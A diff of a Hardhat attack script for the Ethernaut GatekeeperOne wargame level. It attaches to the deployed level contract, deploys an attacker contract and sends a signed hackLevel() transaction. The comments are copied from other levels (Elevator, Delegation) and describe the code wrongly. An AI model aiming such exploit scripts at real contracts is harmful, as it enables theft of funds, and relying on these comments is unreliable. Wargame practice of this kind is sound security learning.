@@ -1,6 +1,9 @@
 /*
-This script will be used to test & validate the algorithm to calculate the required gass to pass the gate two
-Once the algorithm is validated, such an algorithm must be executed against the GateKeeperOne contract (The one deployed by Ethernaut!)
+This elevator won't let you reach the top of your building. Right?
+
+Things that might help:
+Sometimes solidity is not good at keeping promises.
+This Elevator expects to be used from a GatekeeperOneAttacker.
 */
 
 const hre = require("hardhat");
@@ -15,24 +18,38 @@ async function main() {
   // Recreating the attack on ganache
   [player] = await ethers.getSigners();
 
-  // Deploying the CalculateGas contract
-  const CalculateGas = await hre.ethers.getContractFactory("CalculateGas");
-  this.calculateGas = await CalculateGas.connect(player).deploy();
-  await this.calculateGas.deployed();
+  // Get an instance of the contract deployed by Ethernaut
+  const GatekeeperOne = "0xEe5097bF657e8aFDD0d7bF0f8580cfB2C6d777cF"
+  this.gateKeeperOne = await hre.ethers.getContractAt("GatekeeperOne",GatekeeperOne);
+
+  // Deploying a new GatKepperOne contract
+  // const GatekeeperOne = await hre.ethers.getContractFactory("GatekeeperOne");
+  // this.gateKeeperOne = await GatekeeperOne.connect(player).deploy();
+  // await this.gateKeeperOne.deployed();
+
 
   // Deploying the GatekeeperOneAttacker contract
   const GatekeeperOneAttacker = await hre.ethers.getContractFactory("GatekeeperOneAttacker");
-  this.gateKeeperOneAttacker = await GatekeeperOneAttacker.connect(player).deploy(this.calculateGas.address);
+  this.gateKeeperOneAttacker = await GatekeeperOneAttacker.connect(player).deploy(this.gateKeeperOne.address);
   await this.gateKeeperOneAttacker.deployed();
 
   // Getting the bytes4 signature of a function
   // Source -> https://ethereum.stackexchange.com/questions/83165/is-there-a-way-to-get-the-result-of-web3s-encodefunctioncall-with-ethers //
-    // estimateGasForGateTwo() function was renamed to hackLevel()
-  let delegateABI = ["function estimateGasForGateTwo()"];
+  let delegateABI = ["function hackLevel()"];
   let iface = new hre.ethers.utils.Interface(delegateABI); 
-  const selectorHash = iface.encodeFunctionData("estimateGasForGateTwo")
+  const selectorHash = iface.encodeFunctionData("hackLevel")
+
+  console.log(
+    `
+    GateKeeper contract address ${await this.gateKeeperOne.address} \n
+    Entrant: ${await this.gateKeeperOne.entrant()} \n
+    hackLevel() selectorHash: ${selectorHash}
+    `
+  );
+
 
   console.log("\n\n Performing attack ... \n");
+
 
   // Signing and Sending the tx
   const playerWallet = new hre.ethers.Wallet(PRIVATE_KEY);
@@ -47,8 +64,8 @@ async function main() {
     value: 0,
     gasLimit: 6721975,
     gasPrice: gasPrice,
-    // msg.data contains the function signare of pwn(), bcs such a function doesn't exists on the Delegation contract, it will be handled by the fallback() and from there it will be executed a delegateCall() to the Delegate contract forwarding the msg.data
-    // The Delegate contract will recognize the function signature encoded in the msg.data, and will call the pwn(), thus, setting the owner to be the msg.sender, which is the account that called the Delegation contract (bcs the delegateCall())!
+    // msg.data contains the function signare of hackLevel(), bcs such a function doesn't exists on the Delegation contract, it will be handled by the fallback() and from there it will be executed a delegateCall() to the Delegate contract forwarding the msg.data
+    // The Delegate contract will recognize the function signature encoded in the msg.data, and will call the hackLevel(), thus, setting the owner to be the msg.sender, which is the account that called the Delegation contract (bcs the delegateCall())!
     data: selectorHash 
   };
 
@@ -66,6 +83,8 @@ async function main() {
 
   console.log(
     `
+    GateKeeper contract address ${await this.gateKeeperOne.address} \n
+    Entrant: ${await this.gateKeeperOne.entrant()} \n
     found number?: ${await this.gateKeeperOneAttacker.foundNumber()} \n
     required gas: ${await this.gateKeeperOneAttacker.requiredGas()}
     `
